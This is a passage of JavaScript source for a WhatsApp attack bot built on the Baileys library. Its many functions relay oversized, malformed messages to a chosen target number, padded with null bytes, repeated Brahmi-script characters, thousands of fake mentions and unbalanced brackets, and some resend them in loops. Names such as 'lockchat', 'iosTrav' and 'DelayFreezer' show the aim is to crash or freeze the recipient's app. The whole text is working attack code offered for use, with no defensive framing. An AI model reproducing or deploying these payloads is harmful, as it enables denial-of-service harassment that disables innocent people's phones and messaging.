    const msg = await generateWAMessageFromContent(
      target,
      {
        buttonsMessage: {
          text: "#Xylent Empire",
          contentText: "#Xylent Empire" + "ꦾ".repeat(15000),
          footerText: "ꦾ".repeat(30000),
          buttons: [
            {
              buttonId: "X",
              buttonText: {
                displayText: "\u0000".repeat(50000)
              },
              type: 1
            }
          ],
          headerType: 1,
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () => 
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
            isForwarded: true,
            forwardingScore: 99,
            participant: target,
            remoteJid: "0@s.whatsapp.net",
            externalAdReply: {
              title: "\x10".repeat(5000),
              body: "\x10".repeat(5000),
              thumbnailUrl: null,
              sourceUrl: "https://Wa.me/stickerpack/settings",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });

  } catch (err) {
    console.error(err);
  }
}

async function X7DelayGb(sock, target) {
 const X7Msg = {
  groupStatusMessageV2: {
    message: {
     extendedTextMessage: {
       text: "\u0000".repeat(550000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     };
     
   const msg = generateWAMessageFromContent(target, X7Msg, {});
        
     await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
     }
     
     async function X7Klik(sock, target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "Xylent Empire" },
                    footer: { text: "NIH" },
                    contextInfo: {},
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({
                                    booking_id: "Xyzen Official",
                                    status: "confirmed",
                                    business_name: "Xylent Empire",
                                    service_name: "Xylent Empire",
                                    appointment_time: "2026-04-28T10:00:00Z",
                                    customer: {
                                        name: "@pinzyoffc",
                                        phone: "628973824776"
                                    }
                                })
                            }
                        ],
                        messageParamsJson: "{".repeat(9999)
                    }
                }
            }
        }
    }, {})
}

async function fcbutton(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "XYLENT EMPITE" + "ꦽ".repeat(35000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: "{\"display_text\":\"die \",\"url\":\"https://w" + "ꦽ".repeat(35000) + "\"}"
              },
            ]
          }
        }
      }
    }
  }, {});
}

async function RX7DELAYNEW(sock, target) {
      await sock.relayMessage(target, {
          groupStatusMessageV2: {
              message: {
                  interactiveMessage: {
                      body: {
                        text: "\u0000", 
                        format: "DEFAULT"
                      },
                      nativeFlowMessage: {
                          buttons: "{".repeat(544444)
                      },
                      contextInfo: {
                       forwardingScore: 9999,
                       isForwarded: true,
                       entryPointConversionSource: "address_message"
                     }
                  }
              }
          }
      }, { participant: { jid: target }});    

 await sock.relayMessage(target, {
   groupStatusMessageV2: {  
    message: {
      interactiveResponseMessage: {
        body: {
          text: "RX7",
          format: "EXTENSION_1"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RanstechZvX@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"ok\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
          version: 3
        },
        contextInfo: {
         forwardingScore: 9999,
         isForwarded: true,
         entryPointConversionSource: "payment_method"
        }
      }
    }
   }
  }, { participant: { jid: target }});
}

async function Delayft(sock, target) {
    for (let i = 0; i < 100; i++) {    
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\x10"
                        },
                        nativeFlowMessage: {
                            buttons: "[".repeat(500000)
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        });

        await sleep(1000);
    }
}

async function DelayButtonsV2(sock, target) {
    for (let i = 0; i < 100; i++) {    
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\0"
                        },
                        nativeFlowMessage: {
                            buttons: "[".repeat(500000)
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        });

        await sleep(1000);
    }
}

async function BlankWithProto(sock, target) {
    try {
        const message = {
            interactiveMessage: {
                header: {
                    title: "ꦾ".repeat(50000),
                    hasMediaAttachment: false
                },
                body: {
                    text: "ꦽ".repeat(60000)
                },
                footer: {
                    text: "@1".repeat(40000)
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "booking_confirmation",
                            buttonParamsJson: "ꦾ".repeat(100000)
                        }
                    ]
                }
            }
        };
        
        const protoMessage = proto.Message.fromObject(message);
        
        await sock.relayMessage(target, protoMessage, {
            messageId: null,
            participant: { jid: target }
        });
    } catch (err) {
        console.log("Error:", err);
    }
}

async function ForceXDelayX7(sock, target) {
    for (let i = 0; i < 100; i++) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\x10"
                        },
                        contextInfo: {},
                        nativeFlowMessage: {
                            // Dibungkus ke dalam array objek agar valid secara sintaksis di Baileys
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "[".repeat(500000),
                                        id: "force_x_id"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        });

        await sleep(1000);
    }
}


async function invui(sock, target) {
  try {
    let msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "X" + "ꦽ".repeat(20000),
                hasMediaAttachment: false
              },
              body: {
                text: "X" + "ꦽ".repeat(20000)
              },
              footer: {
                text: "X" + "ꦾ".repeat(20000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(10000),
                buttons: [
                  {
                    name: "single_select",
                    buttonsParamsJson: `{"title":"${"ꦾ".repeat(5000)}","sections":[{"title":"${"ꦾ".repeat(5000)}","rows":[{"id":"BS736-DJBDJZ","title":"${"ꦾ".repeat(5000)}","description":"${"ꦾ".repeat(5000)}"}]}]}`
                  },
                  {
                    name: "cta_url",
                    buttonsParamsJson: `{"display_text":"X","url":"https://t.me/${"ꦾ".repeat(10000)}"}`
                  }
                ]
              },
              contextInfo: {
                stanzaId: sock.generateMessageTag(),
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: [target],
                expiration: 1,
                ephemeralSettingTimestamp: 1,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 1,
                disappearingMode: {
                  initiatorDeviceJid: target,
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "UNKNOWN_GROUPS"
                },
                externalAdReply: {
                  title: "X" + "ꦾ".repeat(10000),
                  mediaType: 1,
                  renderLargerThumbnail: true,
                  thumbnailUrl: "https://h.top4top.io/p_37414jxf01.jpg",
                  sourceUrl: "https://Wa.me/stickerpack/settings"
                },
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: null
                  }
                }
              }
            }
          }
        }
      },
      {}
    );
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
  }
}

async function X7Force(sock, target, mention) {
  try {
    const X7 = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/707062092_990233686791803_5791187249860495_n.enc?ccb=11-4&oh=01_Q5Aa4gG3A0lB9m8hbkqmzzr9NICafjhqWAiAf87fzzz6P70M3Q&oe=6A3A5C67&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "lFGMyvJ/fa0ENT/qSsI36qKlD4nAOVmm7l+JLA27bjc=",
        fileLength: "27863",
        height: 512,
        width: 512,
        mediaKey: "6FAAS0F/TCH5hTx2D94qP9/TUSvAJ3IhxowGvN2Se5E=",
        fileEncSha256: "kQiasMsk2L3nSlfq0B+a0ruPFR+USHYL2CmlVNk7Cb0=",
        directPath: "/v/t62.7118-24/707062092_990233686791803_5791187249860495_n.enc?ccb=11-4&oh=01_Q5Aa4gG3A0lB9m8hbkqmzzr9NICafjhqWAiAf87fzzz6P70M3Q&oe=6A3A5C67&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1779622697",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAADBAUBAgYAAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAcaRc5bc9xdcWuPPmK+gMvrgIz5yVlhJ2+XAwq62+0GyG852FILPwKLqZxsNrRqWFPO+JOgCqt0Tmjs6dDO7xJv/EACMQAAICAgEDBQEAAAAAAAAAAAECAAMRIRIEMUEQEyJCYRT/2gAIAQEAAT8AoHHKwReqqLFc4MPUUju8F9R+4j9XUmgeRlLM65b0p51j5DM5gKWl9gL8ipAM4AgGOwDYBMrsVXXkIrjAxGsxOMdDxbECE6Meq0HgDAGX4iP3w0rb4LvxAcn0Y4UmByWJjMBsrGc+BGJOTKLR7QGdxNL6PtGH5CzVOfKwWKyyxlAMJZzrtKzxaI4KgCZmZfRlzxOIyWL9YyORpRChA2ZWcHcomIWC95eSHLAHE/oXBBBMPUodKphy5J4nUKygup/IY5CFGPgx+opYpsaM6dQvvO/HZgs6bguOGOUaynZBWXItjIQR22BAgXtP/8QAHBEAAgIDAQEAAAAAAAAAAAAAAAECERATIRJR/9oACAECAQE/ALLLYpcxYnnjFSxFW0jXH6a4k35dH//EABkRAAIDAQAAAAAAAAAAAAAAAAABEBEhEv/aAAgBAwEBPwCooqXOocN4ds6YtR//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          statusSourceType: "IMAGE"
        },
        scansSidecar: "KRy090WpoLj4UrkdQAdd5hMq0geWreUcCKao1K2PxqR3yUY3tER12A==",
        scanLengths: [3373, 11018, 5500, 7972],
        midQualityFileSha256: "eGJTiN9f5gnEK+alcMZQkNwmVaXJ41E6hKo4mOebumc="
      }
    };
    await sock.relayMessage(target, X7, mention ? { participant: { jid: target } } : {});
    return { status: true, message: "Success sent to " + target };
  } catch (err) {
    return { status: false, message: err.message };
  }
}

async function iosTrav(sock, target) {
  try {
    let msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            extendedTextMessage: {
              text: "#xylent" + "𑇂𑆵𑆴𑆿".repeat(15000),
              matchedText: "#NullStrick" + "𑇂𑆵𑆴𑆿".repeat(10000),
              canonicalUrl: "http://Wa.me/stickerpack/settings",
              title: "#xylent",
              description: "𑇂𑆵𑆴𑆿".repeat(10000),
              jpegThumbnail: null,
              contextInfo: {
                participant: target,
                remoteJid: target,
                mentionedJid: ["13135550001@s.whatsapp.net"],
                externalAdReply: {
                  title: "#xylent",
                  mediaType: 1,
                  renderLargerThumbnail: true,
                  thumbnailUrl: "https://h.top4top.io/p_37414jxf01.jpg",
                  sourceUrl: "https://Wa.me/stickerpack/settings"
                }
              }
            }
          }
        }
      },
      {}
    );
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
  }
}

async function DelayBulldoNew(sock, target) {
    const nullMessage = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                        mimetype: "image/webp",
                        height: 9999,
                        width: 9999,
                        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                        fileLength: 12260,
                        mediaKeyTimestamp: "1743832131",
                        isAnimated: false,
                        stickerSentTs: "X",
                        isAvatar: false,
                        isAiSticker: false,
                        isLottie: false
                    },
                    body: {
                        text: "X7 | AsepExplost"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"X7D\",\"city\":\"chindo\",\"name\":\"X7D\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\x10".repeat(
                            1030000
                        )}\"}}`,
                        version: 3
                    }
                }
            }
        }
    };

    const msg = await generateWAMessageFromContent(target, nullMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function lockchat(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Xylent Empire"
      },
      nativeFlowMessage: {
        // Dibungkus ke dalam array objek agar tidak memicu 'array expected' error
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "\u0000".repeat(500000),
              id: "xylent_id"
            })
          }
        ]
      },
    },
  }, { participant: { jid: target } });
}

async function DelayFreezerByMia(sock, target) {
  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{
  "currency": "IDR",
  "total_amount": {
    "value": 0,
    "offset": 100
  },
  "reference_id": "${Date.now()}",
  "type": "physical-goods",
  "order": {
    "status": "pending",
    "subtotal": {
      "value": 0,
      "offset": 100
    },
    "order_type": "ORDER",
    "items": [
      {
        "name": "${'ꦾ'.repeat(5000)}",
        "amount": {
          "value": 0,
          "offset": 100
        },
        "quantity": 0,
        "sale_amount": {
          "value": 0,
          "offset": 100
        }
      },
      {
        "name": "${'ꦾ'.repeat(4000)}",
        "amount": {
          "value": 999999999,
          "offset": 100
        },
        "quantity": 999,
        "sale_amount": {
          "value": 999999999,
          "offset": 100
        }
      }
    ]
  },
  "payment_settings": [
    {
      "type": "pix_static_code",
      "pix_static_code": {
        "merchant_name": "Mia${'ꦾ'.repeat(3000)}",
        "key": "${'\u0000'.repeat(900000)}",
        "key_type": "xylent"
      }
    },
    {
      "type": "credit_card",
      "credit_card": {
        "merchant_name": "${'𑇂𑆵𑆴𑆿'.repeat(2000)}",
        "amount": 999999999
      }
    }
  ],
  "share_payment_status": false,
  "expiry_time": ${Date.now() + 999999999},
  "retry_count": 999
}`
          }
        ]
      },
      contextInfo: {
        stanzaId: "xylent",
        mentionedJid: Array.from({ length: 1000 }, (_, i) => `6281${i}@s.whatsapp.net`),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }

  await sock.relayMessage(target, msg, { participant: { jid: target } })
}

async function ioskres(sock, target) {
  const zzukif = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "xylent",
        matchedText: "https://Wa.me/stickerpack/zzukitsg",
        description: "𑇂𑆵𑆴𑆿".repeat(20000),
        title: "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, zzukif.message, {
    messageId: zzukif.key.id,
  });  
  await sock.sendMessage(target, {
    text: "xylent" + "𑇂𑆵𑆴𑆿".repeat(12000),
    contextInfo: {
      externalAdReply: {
        title: "𑇂𑆵𑆴𑆿".repeat(15000),
        body: "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "PHOTO",
        remoteJid: " X ",
        conversionSource: " X ",
        conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
        conversionDelaySeconds: 10,
        forwardingScore: 999,
        isForwarded: true,
        quotedAd: {
          advertiserName: " X ",
          mediaType: "IMAGE",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
          caption: " X "
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
        thumbnail: null,
        merchantUrl: `https://whatsapp.${"𑇂𑆵𑆴𑆿".repeat(15000)}.com`
      }
    }
  });
}
///////////////////[END FUNC]////////////////
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();